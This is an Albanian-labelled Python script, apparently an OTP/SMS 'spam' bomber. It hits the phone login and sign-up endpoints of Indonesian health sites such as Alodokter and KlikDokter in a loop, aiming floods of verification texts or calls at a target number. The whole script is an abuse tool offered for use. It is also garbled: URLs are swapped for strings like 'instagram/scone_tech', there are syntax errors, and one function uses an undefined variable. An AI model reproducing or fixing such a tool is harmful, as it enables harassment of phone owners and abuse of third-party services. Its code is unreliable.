import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def alodoc(self,num):
		self.ses.headers.update({'instagram/scone_tech/login-scone_tech'})
		req1=self.ses.get('instagram/scone_tech/login-scone_tech')
		bs1=BS(req1.text,'html.parser')
		token=bs1.find('meta',{'name':'csrf-token'})['content']
#		print(token)

		head={
			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type':'application/json',
			'referer':'https://instagram/scone_tech',
			'accept':'application/json',
			'origin':'instagram/scone_tech',
			'x-csrf-token':token
		}
		req2=self.ses.post('https://www.alodokter.com/login-with-phone-number',headers=head,json={"user":{"phone":num}})
#		print(req2.json())
		if req2.json()['status'] == 'success':
			print("[•] Ishte e sukseshme")
		else:
			print("[-] Deshtoi")

	def klikdok(self,num):
		req1=self.ses.get('Scone-tech')
		bs=BS(req1.text,'html.parser')
		token=bs.find('input',{'name':'_token'})['value']
#		print(token)

		head={
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Origin': 'https:/instagran/scone_tech',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
		}
		ata={
			'_token':token,
			'full_name':'Spamer',
			'email':'ha',
			'phone':num',
			'back-to':'',
			'submit':'Daftar',
		}

		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
#		print(req2.url)
		if "sessions/auth?user=" in req2.url:
			print("[•] Ishte e sukseshme")
		else:
			print("[-] Deshtoi")

	def prosehat(self,num):
		head={
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'origin': 'scone-tech',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'referer': 'scone-tech',
		}
		ata={'phone_or_email':num,'action':'ajaxverificationsend'}

#		print(req.text)
		if "token" in req.text:
			print("[•] Ishte e sukseshme")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()
		else:
			print(f"[-] Deshtoi {req.text}")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()

while True:
	try:
		os.system('clear')
		print("""
		[ Tanya Dokter OTP ]
		 - By ALBANIAN-SECURITY -
[ Spam List ]
1. Sms
2. Thirja 
3. Scone-Tech
	""")
		zgj=int(input("> Zgjedh: "))
		print("="*25)
		num=input("[?] Numri Target: ")
		lop=int(input("[?] Looping: "))
		print()

		main=docter()
		if zgj == 1:
			for i in range(lop):
				main.alodoc(num)
		elif  == 2:
			for i in range(lop):
				main.klikdok(num)
		elif zgj == 3:
			for i in range(lop):
				main.prosehat(num)
		else:
			print("?: Ti je i verber!?")

		lgi=input("\n[?] Provo perseri (Y/n) ")
		if lgi.lower() == 'n':
			sys.exit('GOODBYE :*')
	except Exception as Err:
		sys.exit(Err)
